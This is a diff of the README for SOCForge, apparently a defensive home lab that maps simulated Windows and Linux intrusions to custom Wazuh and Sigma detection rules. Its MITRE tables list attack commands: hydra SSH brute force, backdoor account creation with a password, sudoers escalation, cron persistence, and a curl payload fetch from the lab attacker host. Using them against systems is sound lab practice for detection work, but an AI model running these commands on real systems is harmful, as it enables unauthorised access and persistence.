@@ -2,8 +2,9 @@
 
 [![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-v14.1-red.svg)](https://attack.mitre.org/)
 [![Wazuh SIEM](https://img.shields.io/badge/Wazuh-v4.14.7-blue.svg)](https://wazuh.com/)
+[![Sigma Rules](https://img.shields.io/badge/Sigma%20Rules-10%20Engineered-brightgreen.svg)](detections/sigma/)
 [![Sysmon](https://img.shields.io/badge/Microsoft%20Sysmon-v15.21-0078D4.svg)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
-[![Target OS](https://img.shields.io/badge/Target-Windows%2011%20Enterprise-00A4EF.svg)](https://www.microsoft.com/windows)
+[![Target OS](https://img.shields.io/badge/Target-Windows%2011%20%7C%20Ubuntu%2024.04-00A4EF.svg)](https://ubuntu.com/)
 [![Attacker](https://img.shields.io/badge/Attacker-Kali%20Linux-557C94.svg)](https://www.kali.org/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
@@ -13,23 +14,10 @@
 
 **SOCForge** is an enterprise-grade cybersecurity detection engineering, attack simulation, and incident investigation laboratory built inside an isolated virtual environment. 
 
-It demonstrates the complete lifecycle of modern security operations: from external adversary reconnaissance and HTTP C2 ingress staging, through privilege escalation and persistence, to real-time SIEM detection rule authoring, hypothesis-driven threat hunting, and verified forensic eradication.
+It demonstrates the complete lifecycle of modern cross-platform security operations across **Windows (Sysmon)** and **Linux (Auditd/PAM)**: from external adversary reconnaissance and HTTP C2 ingress staging, through privilege escalation and persistence, to real-time SIEM detection rule authoring, hypothesis-driven threat hunting, and verified forensic eradication.
 
-```text
-                  ┌───────────────────────────────────────────────┐
-                  │                 SOCFORGE LAB                  │
-                  └───────────────────────┬───────────────────────┘
-                                          │
-                  ┌───────────────────────┴───────────────────────┐
-                  ▼                                               ▼
-     ⚔️ ATTACK SIMULATION                           🛡️ DEFENSE & DETECTION
-   • Kali Linux (192.168.56.101)                 • Wazuh Manager v4.14.7 (192.168.56.104)
-   • Nmap Port Reconnaissance                     • Microsoft Sysmon v15.21 (Schema 4.90)
-   • Python HTTP C2 Staging Server                • 6 Custom Detection Rules (100100-100105)
-   • Obfuscated PowerShell & Execution Bypass     • Real-time EventChannel Ingestion
-   • Scheduled Task Persistence                   • Hypothesis-Driven Threat Hunting
-   • Admin Backdoor Account Creation              • Forensic Eradication & Verification
-```
+
+<img width="1276" height="378" alt="image" src="https://github.com/user-attachments/assets/43593d01-48a5-4546-be5d-2488754104a6" />
 
 ---
 
@@ -37,13 +25,14 @@ It demonstrates the complete lifecycle of modern security operations: from exter
 
 | Metric | Result | Context |
 |:---|:---:|:---|
-| **Total Custom Detections Engineered** | **6** | Custom XML rules (`100100`–`100105`) |
-| **Detections Validated Live** | **6 / 6 (100%)** | Unit-tested with `wazuh-logtest` & live telemetry |
-| **MITRE ATT&CK Coverage** | **6 Tactics / 10 Techniques** | Recon, Execution, Persistence, PrivEsc, C2, Discovery |
-| **Forensic Timeline Events** | **21 Events** | Reconstructed across 6 strictly chronological phases |
-| **Correlated ProcessGUIDs** | **11 GUIDs** | Traced to root parent session (PID 572) |
-| **Investigation Case Studies** | **CASE-001** | Full incident lifecycle report & timeline |
-| **IR Playbooks Authored** | **2** | Scheduled task eradication & backdoor user removal |
+| **Total Custom Detections Engineered** | **10** | 6 Windows (`100100`–`100105`) + 4 Linux (`100200`–`100203`) |
+| **Sigma Generic Signatures Authored** | **10 Rules** | Standard SIEM-agnostic YAML in [`detections/sigma/`](detections/sigma/) |
+| **Detections Validated Live** | **10 / 10 (100%)** | Unit-tested with `wazuh-logtest` & validated on live endpoints |
+| **Monitored Endpoint Platforms** | **Windows & Linux** | Windows 11 Enterprise (Sysmon) + Ubuntu Server 24.04 (Auditd) |
+| **MITRE ATT&CK Coverage** | **7 Tactics / 14 Techniques** | Recon, Initial Access, Execution, Persistence, PrivEsc, Defense Evasion, C2 |
+| **Investigation Case Studies** | **CASE-001 & CASE-002** | Full incident lifecycles across Windows and Linux |
+| **IR Playbooks Authored** | **3 Playbooks** | Task eradication, Windows backdoor, Linux backdoor & cron |
+
 
 ---
 
@@ -65,37 +54,17 @@ The custom **SOCForge Security Operations Dashboard** provides single-pane-of-gl
 
 ## 🏗️ Architecture & Network Topology
 
-```text
-┌───────────────────────────────────────────────────────────────────────────────────┐
-│                           SOCFORGE LAB ARCHITECTURE                               │
-├───────────────────────────────────────────────────────────────────────────────────┤
-│                                                                                   │
-│    🐉 ATTACKER (Kali Linux)                                                       │
-│       IP: 192.168.56.101                                                          │
-│       Services: Python HTTP Stager (Port 8080), Nmap Reconnaissance               │
-│                                                                                   │
-│                             │  [Host-Only Subnet: 192.168.56.0/24]                │
-│                             ▼                                                     │
-│    🪟 TARGET ENDPOINT (Windows 11)                                                │
-│       Hostname: OniNaruto | IP: 192.168.56.105                                    │
-│       Sensors: Microsoft Sysmon v15.21 (Schema 4.90) + Wazuh Agent v4.14.7        │
-│       Telemetry: ProcessCreate (1), NetConnect (3), ImageLoad (7), FileCreate (11)│
-│                                                                                   │
-│                             │  [Wazuh Agent Protocol / Port 1514]                 │
-│                             ▼                                                     │
-│    🛡️ SIEM & ANALYSIS (Ubuntu Server 24.04)                                       │
-│       Hostname: socforgewazuh | IP: 192.168.56.104                                │
-│       Stack: Wazuh Manager, OpenSearch Indexer, Wazuh Dashboard                   │
-│       Engine: Analysisd Rule Engine + Custom SOCForge Detection Rules             │
-│                                                                                   │
-└───────────────────────────────────────────────────────────────────────────────────┘
-```
+<img width="1277" height="552" alt="image" src="https://github.com/user-attachments/assets/f94b0436-b28e-46bc-bebf-3f86b4e78017" />
+
 *See [`architecture/architecture.md`](architecture/architecture.md) for full topology details.*
+
+
 
 ---
 
 ## 🗺️ MITRE ATT&CK Matrix & Live SIEM Heatmap
 
+### 🪟 Windows Intrusion Simulation (`CASE-001` / `SCENARIO-001`)
 | MITRE Tactic | Technique ID | Technique Name | Simulation Command / Telemetry | Detection Rule | Level |
 |:---|:---|:---|:---|:---|:---:|
 | **Discovery** | `T1046` | Network Service Discovery | `nmap -Pn -sS -p 135-5985 192.168.56.105` | Sysmon EID 3 (Inbound) | Low |
@@ -108,6 +77,17 @@ The custom **SOCForge Security Operations Dashboard** provides single-pane-of-gl
 | **Persistence** | `T1053.005` | Scheduled Task Creation | `schtasks.exe /create /tn "SOCForgePersistence"...` | Rule `100104` / Native `92154` | **Level 10** |
 | **Privilege Escalation** | `T1136.001` / `T1098` | Local Account & Manipulation | `net user socforge_backdoor P@ssw0rd123! /add` | Rule `100105` | **Level 10** |
 
+### 🐧 Linux Intrusion Simulation (`CASE-002` / `SCENARIO-002`)
+| MITRE Tactic | Technique ID | Technique Name | Simulation Command / Telemetry | Detection Rule | Level |
+|:---|:---|:---|:---|:---|:---:|
+| **Credential Access** | `T1110.001` | Password Guessing (Brute Force) | `hydra -l socforgelinux -P rockyou.txt ssh://192.168.56.107` | Rule `5712` | **Level 10** |
+| **Initial Access** | `T1078` | Valid Accounts (SSH Login) | `ssh socforgelinux@192.168.56.107` | Rule `5715` | Level 3 |
+| **Discovery** | `T1087.001` / `T1082` | Local Accounts & System Discovery | `whoami`, `id`, `uname -a`, `cat /etc/passwd`, `sudo -l` | PAM / Auditd | Level 3 |
+| **Privilege Escalation** | `T1136.001` | Rogue User Account Creation | `sudo useradd -m -s /bin/bash socforge_backdoor` | **Rule `100200`** | **Level 10** |
+| **Privilege Escalation** | `T1098` / `T1548.003` | Sudoers Group Escalation | `sudo usermod -aG sudo socforge_backdoor` | **Rule `100201`** | **Level 10** |
+| **Persistence** | `T1053.003` | Scheduled Cron Persistence | `echo "* * * * * root ..." \| sudo tee /etc/cron.d/socforge_persistence` | **Rule `100202`** | **Level 10** |
+| **Command & Control** | `T1105` / `T1071.001` | Ingress Tool Transfer | `curl -o /tmp/payload.sh http://192.168.56.101:8080/linux_payload.sh` | **Rule `100203`** | **Level 8** |
+
 ### 📊 Live Wazuh MITRE ATT&CK Dashboard View
 
 ![Wazuh MITRE ATT&CK Framework Matrix](screenshots/dashboards/wazuh_mitre_framework.png)
@@ -116,16 +96,25 @@ The custom **SOCForge Security Operations Dashboard** provides single-pane-of-gl
 
 ## 📜 Custom Detection Engineering Catalog
 
-All 6 custom rules are located in [`detections/wazuh/local_rules.xml`](detections/wazuh/local_rules.xml):
+All 10 custom rules are engineered in both **Wazuh XML** (`local_rules.xml`) and **SIEM-Agnostic Sigma YAML**:
 
-| Rule ID | Detection Focus | MITRE Technique | Rule Deep Dive |
-|:---:|:---|:---:|:---|
-| **`100100`** | PowerShell Process Execution | `T1059.001` | [`detections/windows/powershell-execution.md`](detections/windows/powershell-execution.md) |
-| **`100101`** | Obfuscated / Encoded PowerShell | `T1059.001` / `T1027` | [`detections/windows/powershell-execution.md`](detections/windows/powershell-execution.md) |
-| **`100102`** | Command Shell Spawned by PowerShell | `T1059.003` | [`detections/windows/powershell-execution.md`](detections/windows/powershell-execution.md) |
-| **`100103`** | Outbound C2 Network Traffic | `T1071.001` | [`detections/windows/c2-network-traffic.md`](detections/windows/c2-network-traffic.md) |
-| **`100104`** | Scheduled Task Persistence | `T1053.005` | [`detections/windows/scheduled-task-persistence.md`](detections/windows/scheduled-task-persistence.md) |
-| **`100105`** | Backdoor User & Privilege Escalation | `T1136.001` / `T1098` | [`detections/windows/account-manipulation.md`](detections/windows/account-manipulation.md) |
+### 🪟 Windows Telemetry Rules (`100100` – `100105`)
+| Rule ID | Detection Focus | MITRE Technique | Wazuh Deep Dive | Sigma Rule (YAML) |
+|:---:|:---|:---:|:---|:---|
+| **`100100`** | PowerShell Process Execution | `T1059.001` | [`powershell-execution.md`](detections/windows/powershell-execution.md) | [`proc_creation_win_powershell_execution.yml`](detections/sigma/proc_creation_win_powershell_execution.yml) |
+| **`100101`** | Obfuscated / Encoded PowerShell | `T1059.001` / `T1027` | [`powershell-execution.md`](detections/windows/powershell-execution.md) | [`proc_creation_win_powershell_encoded_command.yml`](detections/sigma/proc_creation_win_powershell_encoded_command.yml) |
+| **`100102`** | Command Shell Spawned by PowerShell | `T1059.003` | [`powershell-execution.md`](detections/windows/powershell-execution.md) | [`proc_creation_win_powershell_spawning_cmd.yml`](detections/sigma/proc_creation_win_powershell_spawning_cmd.yml) |
+| **`100103`** | Outbound C2 Network Traffic | `T1071.001` | [`c2-network-traffic.md`](detections/windows/c2-network-traffic.md) | [`net_connection_win_c2_suspicious_traffic.yml`](detections/sigma/net_connection_win_c2_suspicious_traffic.yml) |
+| **`100104`** | Scheduled Task Persistence | `T1053.005` | [`scheduled-task-persistence.md`](detections/windows/scheduled-task-persistence.md) | [`proc_creation_win_schtasks_persistence.yml`](detections/sigma/proc_creation_win_schtasks_persistence.yml) |
+| **`100105`** | Backdoor User & Privilege Escalation | `T1136.001` / `T1098` | [`account-manipulation.md`](detections/windows/account-manipulation.md) | [`proc_creation_win_net_account_creation.yml`](detections/sigma/proc_creation_win_net_account_creation.yml) |
+
+### 🐧 Linux Telemetry Rules (`100200` – `100203`)
+| Rule ID | Detection Focus | MITRE Technique | Wazuh Deep Dive | Sigma Rule (YAML) |
+|:---:|:---|:---:|:---|:---|
+| **`100200`** | Rogue Local User Account via Useradd | `T1136.001` | [`linux-account-privesc.md`](detections/linux/linux-account-privesc.md) | [`proc_creation_lnx_useradd_backdoor.yml`](detections/sigma/proc_creation_lnx_useradd_backdoor.yml) |
+| **`100201`** | Sudoers Group Privilege Escalation | `T1098` / `T1548.003` | [`linux-account-privesc.md`](detections/linux/linux-account-privesc.md) | [`proc_creation_lnx_usermod_sudoers.yml`](detections/sigma/proc_creation_lnx_usermod_sudoers.yml) |
+| **`100202`** | Scheduled Cron Persistence Creation | `T1053.003` | [`linux-cron-persistence.md`](detections/linux/linux-cron-persistence.md) | [`proc_creation_lnx_cron_persistence.yml`](detections/sigma/proc_creation_lnx_cron_persistence.yml) |
+| **`100203`** | Ingress Tool Transfer via Curl/Wget | `T1105` / `T1071.001` | [`linux-c2-ingress.md`](detections/linux/linux-c2-ingress.md) | [`lnx_ingress_tool_transfer_curl.yml`](detections/sigma/lnx_ingress_tool_transfer_curl.yml) |
 
 ---
 
@@ -148,30 +137,44 @@ SOCForge/
 │
 ├── detections/
 │   ├── wazuh/
-│   │   └── local_rules.xml             # Production XML detection rules (100100–100105)
-│   └── windows/
-│       ├── powershell-execution.md     # Rules 100100, 100101, 100102 deep dive
-│       ├── scheduled-task-persistence.md # Rule 100104 deep dive
-│       ├── account-manipulation.md     # Rule 100105 deep dive
-│       └── c2-network-traffic.md       # Rule 100103 deep dive
+│   │   └── local_rules.xml             # Production XML detection rules (100100–100203)
+│   ├── sigma/
+│   │   ├── README.md                   # Sigma catalog & SIEM query translation guide
+│   │   └── *.yml                       # 10 Standard SIEM-agnostic Sigma rules
+│   ├── windows/                        # Windows detection rule deep-dives
+│   │   ├── powershell-execution.md
+│   │   ├── scheduled-task-persistence.md
+│   │   ├── account-manipulation.md
+│   │   └── c2-network-traffic.md
+│   └── linux/                          # Linux detection rule deep-dives
+│       ├── linux-account-privesc.md
+│       ├── linux-cron-persistence.md
+│       └── linux-c2-ingress.md
 │
 ├── attack-scenarios/
-│   └── 001-kali-windows-intrusion/
-│       ├── scenario.md                 # Step-by-step adversary simulation playbook
-│       └── payload.ps1                 # Benign test stager script
+│   ├── 001-kali-windows-intrusion/     # Windows multi-stage attack playbook
+│   │   ├── scenario.md
+│   │   └── payload.ps1
+│   └── 002-kali-linux-intrusion/       # Linux multi-stage attack playbook
+│       ├── scenario.md
+│       └── payload.sh
 │
 ├── investigations/
-│   └── CASE-001/
-│       ├── investigation.md            # Master incident investigation case report
-│       └── timeline.md                 # Strictly chronological 21-event timeline
+│   ├── CASE-001/                       # Windows incident investigation case report & timeline
+│   │   ├── investigation.md
+│   │   └── timeline.md
+│   └── CASE-002/                       # Linux incident investigation case report & timeline
+│       ├── investigation.md
+│       └── timeline.md
 │
 ├── threat-hunting/
 │   ├── hypothesis-001-lolbins.md       # Hypothesis-driven hunt for LOLBins & bypasses
 │   └── hunting-queries.md              # Master grep hunting queries & ProcessGUID table
 │
 ├── incident-response/
-│   ├── scheduled-task-eradication.md   # Task persistence removal playbook
-│   └── backdoor-account-removal.md     # Rogue administrator account removal playbook
+│   ├── scheduled-task-eradication.md   # Windows task persistence removal playbook
+│   ├── backdoor-account-removal.md     # Windows backdoor administrator removal playbook
+│   └── linux-backdoor-and-cron-eradication.md # Linux rogue user & cron eradication playbook
 │
 ├── validation/
 │   └── detection-test-results.md       # Logtest and live validation matrix
@@ -179,6 +182,7 @@ SOCForge/
 └── screenshots/
     └── dashboards/                     # Live Wazuh SIEM portal evidence
 ```
+
 
 ---
 
